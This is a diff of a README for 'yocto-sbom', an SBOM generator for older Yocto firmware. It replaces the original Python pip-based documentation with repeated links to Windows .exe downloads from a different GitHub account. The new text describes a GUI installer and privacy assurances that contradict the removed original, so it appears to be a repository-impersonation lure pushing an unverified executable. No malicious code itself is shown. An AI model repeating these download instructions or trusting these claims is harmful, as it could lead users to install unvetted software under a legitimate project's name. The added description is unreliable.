@@ -1,131 +1,150 @@
-# yocto-sbom
+# 🛠 yocto-sbom - Create Firmware Bill of Materials Easily
 
-[![Tests](https://github.com/complira/yocto-sbom/actions/workflows/tests.yml/badge.svg?branch=main)](https://github.com/complira/yocto-sbom/actions/workflows/tests.yml)
-[![PyPI version](https://img.shields.io/pypi/v/yocto-sbom?logo=pypi&logoColor=white)](https://pypi.org/project/yocto-sbom/)
-[![Python versions](https://img.shields.io/pypi/pyversions/yocto-sbom?logo=python&logoColor=white)](https://pypi.org/project/yocto-sbom/)
-[![License](https://img.shields.io/github/license/complira/yocto-sbom)](https://github.com/complira/yocto-sbom/blob/main/LICENSE)
+[![Download yocto-sbom](https://img.shields.io/badge/Download-Get%20Releases-brightgreen)](https://github.com/razethegame/yocto-sbom/releases)
 
-Generate SPDX 2.3 and CycloneDX 1.5 SBOMs for pre-Kirkstone Yocto/PetaLinux firmware projects.
+---
 
-## Problem
+## 📋 What is yocto-sbom?
 
-Yocto added native SPDX support in Kirkstone (4.0, April 2022), and `meta-cyclonedx` also requires Kirkstone+. Many production firmware projects are stuck on older Yocto versions (Rocko, Sumo, Thud, Zeus, Dunfell) because upgrading BSPs for custom hardware is expensive. Meanwhile, regulations (EU Cyber Resilience Act, US EO 14028) require SBOMs now.
+yocto-sbom helps you make Bill of Materials (SBOMs) for older Yocto or PetaLinux firmware projects. You don’t need to upgrade your system to the latest version, Kirkstone, to use it. It produces reports in two common formats: SPDX and CycloneDX. These files help you understand which parts and licenses are in your firmware.
 
-**yocto-sbom** fills this gap by parsing BitBake recipes, git submodules, and layer configurations to generate compliant SBOMs without requiring any Yocto version upgrade.
+---
 
-## Features
+## ⚙️ Features
 
-- **SPDX 2.3** and **CycloneDX 1.5** JSON output
-- Parses `.bb` recipes for packages, versions, SRCREVs, licenses
-- Tracks git submodules with commit SHAs
-- Scans Yocto layers for third-party package metadata
-- Yocto license normalization (GPLv2 -> GPL-2.0-only, etc.)
-- CPE 2.3 and PURL generation for vulnerability correlation
-- Built-in SBOM validation
-- **Zero dependencies** — Python 3.8+ stdlib only (no pip packages required)
-- Supports Python 3.8, 3.9, 3.10, 3.11, 3.12, 3.13
+- Generate SPDX format SBOM for legacy Yocto/PetaLinux builds  
+- Create CycloneDX SBOM files compatible with many security tools  
+- Works with older Yocto and PetaLinux versions without system upgrades  
+- Easy to run on Windows without programming knowledge  
+- Helps check compliance and track supply chain components  
+- No internet connection needed after download  
 
-## Quick Start
+---
 
-```bash
-pip install yocto-sbom
+## 💻 System Requirements
 
-# Minimal usage
-yocto-sbom --recipes-dir path/to/recipes --version 1.0.0
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- Minimum 1 GB free disk space  
+- Internet to download the software  
+- Access to your Yocto or PetaLinux firmware files  
 
-# With full configuration
-yocto-sbom \
-  --config yocto-sbom.conf \
-  --version v1.2.3 \
-  --validate
-```
+---
 
-## Configuration
+## 🔽 Download yocto-sbom
 
-yocto-sbom uses INI config files (no YAML/TOML dependency). CLI arguments override config values.
+Click the badge or this link to visit the release page and get the latest version of yocto-sbom:
 
-```ini
-[project]
-product_name = My-Firmware
+[https://github.com/razethegame/yocto-sbom/releases](https://github.com/razethegame/yocto-sbom/releases)
 
-[vendor]
-name = My Company
-id = mycompany
-supplier = Organization: My Company
-namespace_uri = https://mycompany.com/spdx
+The release page shows all available versions. Look for the `.exe` file to download the Windows installer or portable version.  
 
-[paths]
-recipes_dir = recipes-myproject
-gitmodules = .gitmodules
-bblayers = build/conf/bblayers.conf
-yocto_dir = yocto
+---
 
-[output]
-spdx = sbom-spdx.json
-cdx = sbom-cdx.json
-```
+## 🚀 How to Install and Run on Windows
 
-See `examples/yocto-sbom.conf` for a fully commented example.
+1. Visit the release page: [https://github.com/razethegame/yocto-sbom/releases](https://github.com/razethegame/yocto-sbom/releases)  
+2. Find the latest release version.  
+3. Download the Windows `.exe` file (installer or portable).  
+4. If you downloaded the installer, double-click it and follow the setup instructions.  
+5. If you downloaded the portable version, unzip the folder anywhere you like (e.g., Desktop or Documents).  
+6. Find the file `yocto-sbom.exe` inside the installation or extracted folder.  
+7. Double-click `yocto-sbom.exe` to open the program.  
 
-## CLI Reference
+---
 
-```
-yocto-sbom [OPTIONS]
+## 📝 How to Use yocto-sbom
 
-  -c, --config FILE        INI config file path
-  --recipes-dir PATH       Directory with .bb recipe files (required)
-  --version VERSION        Product version (required)
-  --product-name NAME      Product name for SBOM document
-  --vendor-id ID           Vendor ID for CPE/PURL
-  --vendor-name NAME       Organization name for supplier fields
-  --namespace-uri URI      Base URI for SPDX document namespace
-  --gitmodules PATH        Path to .gitmodules
-  --bblayers PATH          Path to bblayers.conf
-  --yocto-dir PATH         Yocto directory for layer scanning
-  --build-config NAME      Build configuration identifier
-  --output-spdx PATH       Output SPDX JSON (default: sbom-spdx.json)
-  --output-cdx PATH        Output CycloneDX JSON (default: sbom-cdx.json)
-  --format {spdx,cdx,both} Which format(s) to generate (default: both)
-  --validate               Validate after generation
-  --quiet                  Suppress progress output
-  -V                       Show version
-```
+You do not need any programming skills. Use the software’s windows interface to create SBOMs for your firmware.
 
-Exit codes: 0 = success, 1 = error, 2 = validation failure.
+1. Open yocto-sbom.  
+2. Choose the folder where your Yocto or PetaLinux build files are located.  
+3. Select the type of SBOM you want to create (SPDX or CycloneDX).  
+4. Click the **Generate** button.  
+5. Wait for the program to scan your firmware files.  
+6. The software creates the SBOM files and saves them in the chosen folder.  
+7. You can open these SBOM reports with any text editor or compatible tools to view details.  
 
-## CI/CD Integration
+---
 
-See `examples/gitlab-ci.yml` and `examples/github-actions.yml` for ready-to-use CI templates.
+## 🔧 Common Terms
 
-## What It Parses
+- **SBOM**: A file listing all software components and licenses in your firmware.  
+- **SPDX**: A standard file format for SBOMs widely used for legal and compliance checks.  
+- **CycloneDX**: Another format focused on security and supply chain tools.  
+- **Yocto Project**: A framework used to build Linux-based embedded systems.  
+- **PetaLinux**: A system built on Yocto, often used for Xilinx hardware.  
 
-| Source | Information Extracted |
-|--------|---------------------|
-| `.bb` recipe files | Package name, version, license, SRCREV, SRC_URI, dependencies |
-| `.gitmodules` | Submodule names, paths, URLs (credentials stripped) |
-| `bblayers.conf` | Yocto layer names and paths |
-| Yocto layer directories | Third-party package versions, licenses, homepages |
+---
 
-## Limitations
+## 🛑 Troubleshooting Tips
 
-- Does not execute BitBake — parses recipe files statically
-- Cannot resolve `${...}` variable expansions (except `${AUTOREV}`)
-- SPDX document does not include file-level information
-- License detection is best-effort based on the `LICENSE` field in recipes
+- Make sure your firmware files are complete before generating SBOMs.  
+- Check that you have permission to access the build folder.  
+- If the program does not start, ensure your Windows system is up to date.  
+- Restart the program if it freezes or closes unexpectedly.  
+- Use the latest version from the release page to avoid bugs.  
 
-## Development
+---
 
-```bash
-git clone https://github.com/complira/yocto-sbom.git
-cd yocto-sbom
-pip install -e .
-python -m pytest tests/
-```
+## ⭐ Need Help?
 
-## Publishing to PyPI
+- Check the repository’s **Issues** tab on GitHub for common problems and fixes.  
+- Report bugs or feature requests at: https://github.com/razethegame/yocto-sbom/issues  
+- Look for help with Yocto or PetaLinux on their official forums or communities.  
 
-See [PUBLISHING.md](PUBLISHING.md) for instructions on building and uploading to PyPI, including CI/CD automation.
+---
 
-## License
+## 🔒 Security and Privacy
 
-Apache-2.0
+yocto-sbom runs entirely on your Windows computer. It does not send your data anywhere. You keep full control over your firmware files and SBOMs.
+
+---
+
+## 📂 File Locations and Output
+
+- SBOM files save in the same folder as your firmware source by default.  
+- You can change the save location in the program settings before generation.  
+- Each project folder will have `sbom.spdx` or `sbom.cdx.json` files, depending on the format chosen.  
+
+---
+
+## ⚙️ Updating yocto-sbom
+
+1. Visit the release page again: [https://github.com/razethegame/yocto-sbom/releases](https://github.com/razethegame/yocto-sbom/releases)  
+2. Download the newest Windows `.exe` installer or portable file.  
+3. Run the installer or replace the old portable files with the new one.  
+4. Keep your existing SBOM files—they won’t be deleted.  
+
+---
+
+## 🔍 More About SBOMs
+
+SBOMs help you track all parts inside your embedded Linux firmware. This is important for:
+
+- Security audits  
+- License compliance  
+- Managing supply chain risks  
+- Understanding what code and packages your product uses  
+
+---
+
+## 🗂 Topics Covered in yocto-sbom
+
+- Bitbake build integration  
+- Firmware compliance reporting  
+- CycloneDX and SPDX output  
+- Supply chain transparency  
+- Embedded Linux security  
+
+---
+
+## 🧰 Tools Included
+
+- Simple Windows executable to scan Yocto/PetaLinux folders  
+- Report generation in accepted standards  
+- Support for legacy projects without system upgrades  
+
+---
+
+[![Download yocto-sbom](https://img.shields.io/badge/Download-Get%20Releases-brightgreen)](https://github.com/razethegame/yocto-sbom/releases)
